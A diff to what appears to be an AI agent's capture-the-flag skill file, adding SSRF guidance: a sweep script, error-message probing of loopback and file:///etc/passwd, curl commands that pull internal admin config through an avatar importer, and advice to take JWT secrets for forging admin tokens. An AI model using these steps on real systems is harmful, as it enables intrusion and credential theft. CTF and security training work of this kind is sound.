@@ -31,6 +31,59 @@ Cookie arrives → set it as `$AUTH_HEADER` and re-probe everything.
 
 ## I. SSRF — URL or callback params
 
+**Reach for the script first — it does the whole chain including the read primitive below:**
+
+```bash
+python ~/.claude/skills/ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" --sweep
+python ~/.claude/skills/ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" /admin/config
+```
+
+### Read the error messages — they tell you if loopback is allowed
+
+Two *different* rejections mean an allowlist, and an allowlist that treats loopback
+specially means the SSRF is intended:
+
+| Response to | Message | Means |
+|---|---|---|
+| `http://169.254.169.254/`, `https://example.com/` | `Only internal image hosts are allowed` | rejected at validation |
+| `http://127.0.0.1/` | `Could not fetch image from URL` | **passed validation, just nothing on :80** |
+| `file:///etc/passwd` | `Only http(s) URLs are allowed` | scheme filter, separate check |
+
+The second row is the green light. Sweep ports before concluding the SSRF is dead.
+
+### The importer probably *stored* what it fetched — that's an arbitrary read
+
+Avatar imports, image fetchers, PDF renderers and webhook testers commonly save the
+fetched body and hand back its URL. Blind SSRF becomes a full read: trigger, then GET
+the artifact. It will happily store HTML/JSON under an image extension.
+
+```bash
+curl -si -X POST <target>/api/profile/avatar/import $AUTH_HEADER -H 'Content-Type: application/json' \
+  -d '{"url":"http://127.0.0.1:3000/admin/config"}'
+# -> {"avatar_url":"/uploads/avatars/<md5>.txt"}
+curl -s <target>/uploads/avatars/<md5>.txt        # <- the internal response body
+```
+
+Always check the response for *any* path-shaped value (`avatar_url`, `file`, `path`,
+`location`) before assuming the SSRF is blind and reaching for OOB.
+
+### "Only the app's own port is open" is not a dead end
+
+A loopback sweep that finds only :3000 (the app itself) looks like nothing — but
+middleware that trusts loopback puts internal APIs on the **same port** behind an
+external-only 403. Enumerate *paths* on it, not just ports:
+
+```bash
+# externally: 403 Forbidden.  via SSRF from loopback: full config + secrets
+curl -si <target>/admin/config                        # {"error":"Forbidden"}
+# through the SSRF -> {"service":"...","jwt_secret":"...","flag":"bug{...}"}
+```
+
+Try `/admin`, `/admin/config`, `/internal`, `/debug`, `/metrics`, `/actuator/env`.
+A root path that returns a service banner (`{"service":...,"endpoints":[...]}`) hands
+you the rest of the map. Grab `jwt_secret`/config values even after the flag lands —
+they forge admin tokens for follow-up objectives.
+
 ```bash
 # localhost
 curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
